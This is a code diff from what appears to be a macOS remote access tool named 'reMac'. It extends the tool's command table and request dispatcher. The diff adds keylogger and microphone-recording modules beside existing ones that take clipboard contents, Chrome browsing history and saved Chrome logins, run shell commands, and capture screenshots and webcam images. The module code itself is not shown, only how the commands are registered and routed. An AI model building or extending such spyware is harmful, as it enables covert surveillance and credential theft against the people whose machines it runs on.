@@ -10,17 +10,24 @@ from modules import mod_chrome_logins
 from modules import mod_shellcmd
 from modules import mod_screenshot
 from modules import mod_webcam
+from modules import mod_keylogger
+from modules import mod_recmic
+from modules import mod_modHelp
+
 from apps.libs.reMac_libbase import reMac_libbase
 
 
 reMacModules = {
-    'hw': mod_hello.mod_hello(),
-    'cb': mod_clipboard.mod_clipboard(),
-    'ch': mod_chrome_history.mod_chrome_history(),
-    'cl': mod_chrome_logins.mod_chrome_logins(),
-    'sh': mod_shellcmd.mod_shellcmd(),
-    'sc': mod_screenshot.mod_screenshot(),
-    'wc': mod_webcam.mod_webcam()
+    'hw': [mod_hello.mod_hello(), 'helloworld', 'Call HelloWorld module', 'hw'],
+    'cb': [mod_clipboard.mod_clipboard(), 'clipboard', 'Call clipboard module', 'cb'],
+    'ch': [mod_chrome_history.mod_chrome_history(), 'chromehist', 'Call Chrome-History module', 'ch'],
+    'cl': [mod_chrome_logins.mod_chrome_logins(), 'chromelogin', 'Call Chrome-Logins module', 'cl'],
+    'sh': [mod_shellcmd.mod_shellcmd(), 'shellcmd', 'Call shell command module', 'sh <cmd to send>'],
+    'sc': [mod_screenshot.mod_screenshot(), 'screenshot', 'Call screenshot module', 'sc'],
+    'wc': [mod_webcam.mod_webcam(), 'webcam', 'Call webcam module', 'wc'],
+    'kl': [mod_keylogger.mod_keylogger(), 'keylogger', 'Call keylogger module', 'kl'],
+    'rm': [mod_recmic.mod_recmic(), 'recmic', 'Call record microphone module', 'rm <seconds to record>'],
+    'mh': [mod_modHelp.mod_modHelp(), 'modHelp', 'Call server modules help module', 'mh <module>']
 }
 
 
@@ -75,8 +82,11 @@ class reMac_libserver(reMac_libbase):
                 or input == "sh" \
                 or input == "sc" \
                 or input == "wc" \
+                or input == "rm" \
                 or input == "d":  # or input == "help":
-            return reMacModules[input].run_mod()
+            return reMacModules[input][0].run_mod()
+        elif input.startswith("mh"):
+            return reMacModules["mh"][0].print_client_help("reMac", reMacModules, input)
         else:
             print(f"Command '{input}' NOT FOUND! Check the following command list")
             # print_help()
@@ -85,7 +95,9 @@ class reMac_libserver(reMac_libbase):
         action = self.request.get("action")
         if action == "hw" \
                 or action == "cb" \
-                or action == "ch":
+                or action == "ch" \
+                or action == "rm" \
+                or action.startswith("mh"):
             answer = self.processInput(action)
             content = {"action": action, "result": answer}
         else:
